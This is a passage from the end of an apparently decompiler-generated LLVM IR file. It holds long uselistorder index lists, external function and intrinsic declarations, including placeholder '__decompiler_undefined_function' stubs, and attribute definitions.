1460, 1461, 243, 1462, 660, 663, 661, 662, 1463, 664, 167, 244, 1251, 1252, 120, 367, 1253, 1254, 68, 159, 665, 358, 22, 21, 245, 1255, 246, 666, 23, 359, 247, 248, 249, 69, 250, 465, 897, 982, 983, 984, 1257, 1256, 1258, 1259, 1260, 1261, 44, 251, 1262, 1263, 1264, 252, 114, 115, 466, 420, 421, 1265, 254, 253, 255, 1266, 256, 1267, 1268, 257, 1144, 1145, 467, 258, 259, 260, 1269, 261, 1270, 262, 263, 898, 264, 899, 900, 901, 905, 701, 709, 710, 712, 697, 116, 70, 333, 334, 698, 711, 699, 671, 700, 702, 672, 703, 673, 704, 674, 705, 675, 706, 676, 707, 677, 708, 713, 714, 468, 715, 126, 902, 667, 903, 469, 904, 361, 360, 906, 907, 908, 909, 266, 265, 910, 911, 912, 678, 331, 913, 105, 106, 332, 914, 103, 104, 470, 916, 917, 668, 918, 919, 920, 921, 922, 471, 923, 924, 925, 168, 670, 926, 927, 928, 669, 929, 930, 472, 931, 932, 935, 936, 937, 267, 933, 268, 934, 269, 915, 1105, 1106, 938, 473, 939, 941, 270, 942, 943, 944, 945, 946, 947, 948, 272, 271, 949, 474, 950, 475, 951, 476, 940, 952, 377, 955, 477, 956, 478, 953, 954, 479, 959, 679, 275, 274, 273, 363, 958, 362, 960, 961, 962, 71, 963, 276, 480, 121, 985, 986, 987, 988, 366, 989, 990, 991, 365, 992, 993, 994, 995, 277, 996, 998, 997, 160, 161, 278, 364, 280, 279, 999, 281, 282, 87, 283, 1002, 1003, 129, 130, 88, 1004, 284, 285, 335, 1005, 287, 1006, 288, 286, 481, 1007, 1008, 1010, 1009, 1011, 289, 1012, 1013, 411, 1014, 1015, 1016, 290, 291, 1017, 292, 1018, 293, 1019, 294, 1020, 1021, 117, 1022, 1023, 295, 1024, 1025, 1026, 296, 1028, 297, 336, 1029, 1027, 1030, 1031, 1032, 298, 1033, 1035, 300, 1037, 1038, 299, 1036, 1039, 162, 483, 484, 1040, 1041, 485, 486, 1042, 482, 1043, 1044, 301, 1045, 1046, 302, 303, 1047, 1048, 163, 1049, 1050, 24, 25, 26, 27, 1051, 1052, 304, 413, 1053, 1054, 487, 1055, 488, 1056, 489, 1057, 490, 1058, 491, 1059, 492, 1060, 412, 1061, 493, 1062, 1063, 1064, 305, 1066, 1067, 306, 337, 1068, 1065, 1069, 1070, 1071, 28, 29, 30, 1072, 307, 1073, 1076, 1077, 72, 1078, 308, 1079, 1080, 309, 338, 1082, 1081, 494, 1083, 1085, 1086, 1087, 1088, 495, 1089, 31, 32, 33, 1084, 34, 35, 1090, 310, 1091, 1092, 311, 1095, 1096, 1097, 339, 1098, 1093, 1094, 1100, 1099, 1101, 312, 1102, 1107, 1108, 313, 1110, 1111, 1112, 314, 496, 1114, 1113, 1109, 1116, 1117, 1115, 1118, 315, 1119, 378, 1146, 497, 1147, 73, 1148, 131, 1149, 1150, 1151, 379, 1152, 498, 1153, 1154, 1155, 45, 368, 1156, 1157, 1271, 316, 1272, 1164, 317, 1165, 318, 1273, 716, 717, 718, 719, 1274, 720, 1275, 1276, 1277, 1278, 319, 320, 499, 1279, 1280, 681, 682, 683, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 689, 1294, 1295, 1296, 1297, 1298, 504, 1299, 1300, 690, 1301, 1302, 1303, 684, 1304, 685, 321, 322, 323, 1305, 1306, 1307, 1308, 691, 1309, 1310, 164, 1311, 1312, 692, 1313, 324, 1314, 1315, 1316, 693, 500, 501, 1317, 1318, 694, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 502, 1333, 1328, 1329, 1330, 1331, 695, 1332, 696, 1334, 503, 1335, 1336, 1337, 1338, 1339, 1340, 686, 1342, 1343, 1344, 1345, 1346, 380, 1347, 1350, 1351, 1348, 1349, 326, 325, 1352, 1353, 1354, 1355, 327, 1356, 1357, 340, 1358, 107, 108, 341, 1359, 109, 110, 505, 1360, 1341, 1361, 631, 680, 687, 688, 1362, 1363, 1364, 1365, 1366, 1367, 414, 1368, 415, 1369, 416, 1370, 417, 729, 418, 419, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633 }
  uselistorder i32* @r4, { 104, 949, 950, 951, 952, 953, 971, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 9, 968, 969, 970, 972, 973, 974, 975, 976, 977, 978, 979, 111, 112, 113, 114, 157, 10, 158, 159, 160, 11, 161, 162, 163, 164, 165, 166, 167, 0, 12, 168, 169, 170, 171, 172, 173, 174, 175, 234, 235, 980, 105, 106, 107, 65, 982, 983, 984, 3, 987, 66, 981, 757, 758, 115, 116, 117, 118, 119, 120, 121, 122, 123, 988, 989, 176, 177, 13, 2, 178, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 14, 179, 180, 181, 182, 183, 184, 185, 186, 205, 15, 206, 207, 187, 188, 190, 16, 191, 194, 17, 195, 196, 18, 197, 198, 19, 199, 200, 20, 201, 202, 21, 203, 56, 204, 189, 208, 22, 209, 210, 211, 212, 213, 214, 215, 192, 193, 108, 109, 110, 124, 125, 126, 127, 23, 128, 24, 25, 129, 130, 131, 132, 133, 134, 135, 140, 141, 26, 142, 143, 27, 144, 145, 28, 146, 147, 29, 148, 149, 30, 150, 151, 31, 152, 153, 136, 137, 138, 139, 154, 155, 156, 216, 217, 218, 32, 219, 220, 221, 33, 222, 223, 224, 225, 226, 227, 52, 228, 229, 230, 231, 232, 233, 236, 237, 238, 239, 408, 240, 985, 986, 762, 763, 764, 765, 766, 767, 690, 691, 409, 410, 1006, 1007, 1008, 768, 769, 64, 1011, 53, 1012, 1013, 1014, 1030, 1032, 1033, 1034, 1031, 1015, 1020, 1028, 1029, 1009, 1021, 1022, 1023, 1024, 67, 770, 771, 4, 34, 772, 35, 773, 774, 775, 1016, 1017, 692, 96, 97, 98, 99, 100, 101, 1010, 1018, 1019, 241, 242, 243, 244, 776, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 36, 792, 793, 794, 795, 777, 778, 779, 693, 694, 695, 696, 697, 698, 699, 700, 701, 37, 702, 703, 704, 705, 706, 707, 708, 709, 710, 796, 818, 819, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 57, 810, 811, 1, 812, 813, 814, 815, 816, 817, 248, 249, 250, 68, 820, 821, 655, 656, 657, 660, 661, 662, 69, 658, 659, 822, 823, 824, 825, 826, 827, 828, 598, 599, 600, 603, 604, 605, 601, 602, 829, 830, 831, 832, 833, 834, 835, 70, 836, 837, 838, 839, 840, 841, 842, 843, 844, 251, 252, 253, 254, 255, 256, 71, 411, 412, 413, 414, 415, 416, 417, 245, 246, 247, 418, 419, 420, 421, 8, 422, 423, 424, 425, 426, 427, 428, 845, 846, 847, 850, 851, 852, 848, 849, 257, 258, 259, 260, 261, 262, 1025, 1026, 1027, 263, 264, 265, 429, 430, 431, 432, 433, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 853, 854, 855, 856, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 296, 297, 298, 299, 94, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 95, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 364, 365, 366, 367, 368, 369, 5, 358, 359, 360, 361, 362, 363, 314, 315, 316, 317, 663, 664, 665, 666, 667, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 389, 390, 391, 392, 393, 394, 395, 383, 384, 385, 386, 387, 388, 102, 396, 397, 398, 399, 55, 401, 400, 54, 402, 403, 404, 405, 406, 6, 407, 434, 38, 7, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 460, 454, 455, 456, 457, 458, 459, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 39, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 40, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 41, 533, 42, 534, 43, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 44, 561, 45, 562, 46, 563, 47, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 48, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 668, 669, 670, 671, 49, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 749, 746, 747, 748, 750, 751, 752, 753, 754, 755, 756, 857, 858, 759, 760, 761, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 50, 888, 58, 889, 890, 63, 891, 893, 894, 895, 62, 892, 51, 896, 897, 898, 899, 900, 901, 902, 61, 903, 904, 905, 60, 906, 907, 908, 59, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 103, 948 }
}

declare i32 @__libc_errno(i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
